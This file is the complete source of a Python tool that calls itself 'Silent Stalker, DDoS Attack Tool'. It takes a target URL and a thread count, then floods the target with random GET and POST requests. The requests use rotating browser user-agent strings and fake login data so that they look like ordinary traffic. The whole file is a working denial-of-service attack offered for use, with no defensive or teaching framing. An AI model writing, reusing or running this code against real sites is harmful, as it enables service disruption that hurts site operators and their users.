import os
import requests
import threading
import random
import time

running = True
postrq = ""

def limpiar_pantalla():
    os.system('cls' if os.name == 'nt' else 'clear')

def post_rqs():
    try:
        post_rq_choice = int(input("For post requests use:\n1. Json\n2. Data\nChoice option: "))
        if post_rq_choice <= 0 or post_rq_choice >= 3:
            print("Invalid option...")
            time.sleep(2)
            limpiar_pantalla()
            main()
    except:
        print("Invalid input...")
        time.sleep(2)
        limpiar_pantalla()
        main()
    return "json" if post_rq_choice == 1 else "data"

def logo():
    limpiar_pantalla()
    print("  ____    ____  ")
    print(" / ___|  / ___| ")
    print("| |     | |     ")
    print(" \___ \  \___ \ ")
    print("  ___) |  ___) |")
    print(" |____/  |____/ \n")
    print("Silent Stalker\nDDoS Attack Tool\nBy: TheYoungHackerHa\n\nTo Stop The Tool Type Ctrl + C\n")

def enviar_solicitudes(url):
    global running, postrq
    fallos = 0
    while running:
        try:
            metodo = random.choice(["GET", "POST"])
            headers = {"User-Agent": random_user_agent()}
            if metodo == "GET":
                respuesta = requests.get(url, headers=headers, params=random_params(), timeout=1)
            else:
                if postrq == "json":
                    respuesta = requests.post(url, headers=headers, json=random_data(), timeout=1)
                elif postrq == "data":
                    respuesta = requests.post(url, headers=headers, data=random_data(), timeout=1)
            if respuesta.status_code >= 500:
                fallos += 1
            print(f"{metodo}, Requests send, status: {respuesta.status_code}, Response time: {respuesta.elapsed.total_seconds()} seconds, Fails: {fallos}")
            time.sleep(random.uniform(0.1, 0.2))
        except Exception as e:
            print(f"Error sending request: {e}")

def ataque_ddos(url, num_hilos):
    global running
    print(f"Initiating DDoS attack on {url} with {num_hilos} threads")
    threads = []
    for _ in range(num_hilos):
        hilo = threading.Thread(target=enviar_solicitudes, args=(url,))
        hilo.start()
        threads.append(hilo)
    try:
        for hilo in threads:
            hilo.join()
    except KeyboardInterrupt:
        print("\nStopping attack...")
        running = False

def main():
    global postrq
    logo()
    url = input("Enter the URL ( https:// ): ")
    try:
        num_hilos = int(input("Enter the number of threads: "))
    except ValueError:
        print("Enter a valid number")
        time.sleep(2)
        limpiar_pantalla()
        main()
    postrq = post_rqs()
    ataque_ddos(url, num_hilos)

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
    ]
    return random.choice(user_agents)

def random_params():
    return {
        "id": random.randint(1, 1000),
        "search": random.choice(["test", "admin", "login", "password"]),
        "lang": random.choice(["en", "es", "fr", "de"])
    }

def random_data():
    return {
        "username": f"user{random.randint(1, 1000)}",
        "password": f"pass{random.randint(1000, 9999)}",
        "email": f"user{random.randint(1, 1000)}@mail.com"
    }

if __name__ == "__main__":
    main()